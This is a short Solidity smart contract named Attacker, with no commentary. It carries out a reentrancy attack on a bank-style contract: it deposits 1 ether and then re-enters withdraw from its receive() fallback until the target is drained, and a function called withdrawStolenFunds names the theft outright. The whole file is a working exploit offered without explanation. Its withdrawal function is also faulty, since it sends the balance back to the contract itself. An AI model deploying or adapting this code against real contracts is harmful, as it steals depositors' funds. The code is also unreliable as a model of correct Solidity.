//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IeBank {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IeBank targetContract;
    uint256 private constant ETHER_AMOUNT = 1 ether;

    constructor(address target) {
        targetContract = IeBank(target);
    }

    receive() external payable {
        if (address(targetContract).balance >= ETHER_AMOUNT) {
            targetContract.withdraw(ETHER_AMOUNT);
        }
    }

    function attack() external payable {
        require(msg.value >= ETHER_AMOUNT);
        targetContract.deposit{value: 1 ether}();
        targetContract.withdraw(ETHER_AMOUNT);
    }

    function withdrawStolenFunds() public {
        payable(address(this)).transfer(address(this).balance);
    }
}
